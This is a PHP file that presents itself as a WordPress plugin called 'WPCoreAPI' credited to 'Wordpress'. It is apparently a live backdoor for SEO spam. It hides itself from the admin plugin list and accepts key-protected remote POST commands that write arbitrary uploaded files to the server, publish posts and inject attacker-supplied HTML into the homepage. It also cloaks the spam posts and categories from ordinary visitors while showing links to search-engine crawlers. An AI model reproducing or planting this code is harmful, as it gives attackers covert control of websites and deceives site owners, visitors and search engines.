<?php

/*
* Plugin Name: WPCoreAPI
* Version: 2.1
* Author: Wordpress
*/

    error_reporting(0);

    class dolly_plugin
    {
        var $m_root_path;
        var $m_upload_path;
        var $m_upload_url;
        var $m_request;
        var $m_actions;

        public function __construct()
        {
            $this->m_actions = array('INIT', 'TARGET', 'UPLOAD', 'POST', 'SHOW', 'HTML');
            $this->m_root_path = plugin_dir_path(__FILE__);
            $upload_path = wp_upload_dir();

            if (isset($upload_path['path']) && is_writable($upload_path['path']))
            {
                $this->m_upload_path = $upload_path['path'];
                $this->m_upload_url = $upload_path['url'];
            }

            add_action('init', array($this, 'wp_init'), 0);

            if (is_admin())
                add_action('all_plugins', array($this, 'all_plugins'));

	    add_action('installation_point', array($this, 'insert_html'));
            add_action('dynamic_sidebar', array($this, 'insert_html'));
            add_action('wp_footer', array($this, 'insert_html'));

            if (!$this->is_se_request())
            {
                add_filter('posts_clauses', array($this, 'posts_clauses'), 0, 2);
                add_filter('get_terms_args', array($this, 'get_terms_args'), 0, 2);
            }
	    else
            {
                add_action('installation_point', array($this, 'insert_links'));
                add_action('dynamic_sidebar', array($this, 'insert_links'));
                add_action('wp_footer', array($this, 'insert_links'));
            }

            add_shortcode('dolly_target', array($this, 'process_shortcode'), 3);
            add_filter('get_the_excerpt', array($this, 'get_the_excerpt'));
        }

        private function parse_request()
        {
            $this->m_request = false;

            foreach ($_POST as $key => $value)
            {
                if (stripos($key, 'w_') === false)
                    continue;

                if (!is_array($this->m_request))
                    $this->m_request = array();

                $this->m_request[$key] = $value;
            }

            if (!isset($this->m_request['w_action']) || !isset($this->m_request['w_key']))
                $this->m_request = false;

            return $this->m_request;
        }

        public function wp_init()
        {
            if ($this->parse_request() !== false)
            {
                $action = $this->m_request['w_action'];
                $key_req = $this->m_request['w_key'];
                $key_hash = get_option('w_dolly_hash');

                if (empty($key_hash) && $action == 'INIT')
                    add_option('w_dolly_hash', md5($key_req)) === true ? $this->result(1) : $this->result(0);

                if ((!empty($key_req) && !empty($key_hash)) && ($key_hash != md5($key_req)))
                    $this->result(0);

                switch ($action)
                {
                    case 'TARGET':
                    {
                        if (empty($this->m_request['w_target']))
                            $this->result(0);

                        $target = base64_decode($this->m_request['w_target']);

                        update_option('w_dolly_target', $target) === true ? $this->result(1) : $this->result(0);

                        break;
                    }
                    case 'UPLOAD':
                    {
                        if (empty($this->m_request['w_filename']) || empty($this->m_request['w_filedata']))
                            $this->result(0);

                        $path = $this->m_upload_path . '/' . $this->m_request['w_filename'];
                        $url = $this->m_upload_url . '/' . $this->m_request['w_filename'];
                        $data = base64_decode($this->m_request['w_filedata']);

                        file_put_contents($path, $data) === false ? $this->result(0) : $this->result($url);

                        break;
                    }
                    case 'POST':
                    {
                        if (empty($this->m_request['w_postbody']) || empty($this->m_request['w_posttitle']) || empty($this->m_request['w_postcat']))
                            $this->result(0);

                        $post_body = base64_decode($this->m_request['w_postbody']);
                        $post_cat = $this->m_request['w_postcat'];

                        $cat_id = get_cat_ID($post_cat);

                        if ($cat_id == 0)
                        {
                            $new_term = wp_insert_term($post_cat, 'category');
                            $cat_id = intval($new_term['term_id']);
                        }

                        $cats = get_option('w_dolly_cats');

                        $found = array_search($cat_id, $cats);

                        if ($cat_id && ($found === false || $found === null))
                            $cats[] = $cat_id;

                        update_option('w_dolly_cats', $cats);

			            $excerpt = get_option('w_dolly_excerpt');

                        if (empty($excerpt))
                        {
                            $excerpt = substr($key_hash, 0, 5);
                            add_option('w_dolly_excerpt', $excerpt);
                        }

                        $post_body = str_replace('%TARGET%', '[dolly_target]', $post_body);

                        $new_post = array(
                            'post_title'    => $this->m_request['w_posttitle'],
                            'post_content'  => $post_body,
                            'post_status'   => 'publish',
                            'post_author'   => 1,
                            'post_category' => array($cat_id),
                            'post_excerpt' => $excerpt
                        );

                        $post_id = wp_insert_post($new_post);

                        if (is_int($post_id) && $post_id > 0)
                        {
                            update_post_meta($post_id, 'w_dolly_key', $this->m_request['w_postkey']);

                            $this->result(1);
                        }

                        $this->result(0);

                        break;
                    }
                    case 'SHOW':
                    {
                        $cats = get_option('w_dolly_cats');
                        $ret = "";

                        foreach ($cats as $cat_id)
                        {
                            $url = get_category_link($cat_id);
                            $ret .= $url . "|";
                        }

			            if ($ret !== "")
				            $ret = substr($ret, 0, -1);

                        $this->result($ret);

			break;
                    }
                    case 'HTML':
                    {
                        if (empty($this->m_request['w_html']))
                            $this->result(0);

                        $html = base64_decode($this->m_request['w_html']);

			update_option('w_dolly_html', $html) === true ? $this->result(1) : $this->result(0);

			break;
                    }
                }
            }
        }

        public function process_shortcode($attrs, $content, $name)
        {
            global $post;
            $target = get_option('w_dolly_target');

            if (!empty($target))
            {
                $post_key = '';

                if (!empty($post))
                    $post_key = get_post_meta($post->ID, 'w_dolly_key', true);

                $content = str_replace('%KEY%', $post_key, $target);
            }

            return $content;
        }

        public function get_the_excerpt($ex)
        {
            $excerpt = get_option('w_dolly_excerpt');

            $ex = (!empty($excerpt) && ($excerpt == $ex)) ? '' : $ex;

            return $ex;
        }

        public function all_plugins($plugins)
        {
            $self_file = str_replace($this->m_root_path, '', __FILE__);

            foreach ($plugins as $plugin_file => $plugin_data)
            {
                if (stripos($plugin_file, $self_file) !== false)
                {
                    unset($plugins[$plugin_file]);
                    break;
                }
            }

            return $plugins;
        }

        public function posts_clauses($pieces, $query)
        {
            global $wpdb;
            $excerpt = get_option('w_dolly_excerpt');

            if (!empty($excerpt))
                $pieces['where'] .= " AND {$wpdb->posts}.post_excerpt != '{$excerpt}'";

            return $pieces;
        }

        public function get_terms_args($args, $taxonomies)
        {
            $cats = get_option('w_dolly_cats');

            if (!empty($cats) && is_array($args['exclude']))
                $args['exclude'] = array_merge($args['exclude'], $cats);
            else if (!empty($cats))
                $args['exclude'] = $cats;

            return $args;
        }

	public function insert_html($args)
	{
	    global $g_html_inserted;

	    if (!isset($g_html_inserted) && $_SERVER["REQUEST_URI"] == "/")
            {
                $html = get_option('w_dolly_html');

                if (!empty($html))
                    echo $html;

                $g_html_inserted = true;
             }
	}

        public function insert_links($args)
        {
            global $g_links_inserted;

            if (!isset($g_links_inserted))
            {
		echo "\r\n";

		echo "<ul>\r\n";
                wp_get_archives();
		echo "</ul>\r\n";

                $cats = get_option('w_dolly_cats');

                if (!empty($cats))
		{
		    echo "\r\n<ul>\r\n";
                    wp_list_categories('orderby=name&include=' . implode(',', $cats));
		    echo "\r\n</ul>\r\n";
		}

		echo "\r\n";

                $g_links_inserted = true;
            }
        }

        private function result($code)
        {
            die('[***[' . $code . ']***]');
        }

        private function is_se_request()
        {
            $is_se = false;
            $se_name = array('google', 'yahoo', 'msn', 'bing');

            $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
            $agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

            if (!empty($referer) || !empty($agent))
            {
                foreach ($se_name as $name)
                {
                    if (stripos($referer, $name) !== false || stripos($agent, $name) !== false)
                    {
                        $is_se = true;

                        break;
                    }
                }
            }

            return $is_se;
        }
    }

global $g_dolly_plugin;

if (!isset($g_dolly_plugin))
    $g_dolly_plugin = new dolly_plugin();

?>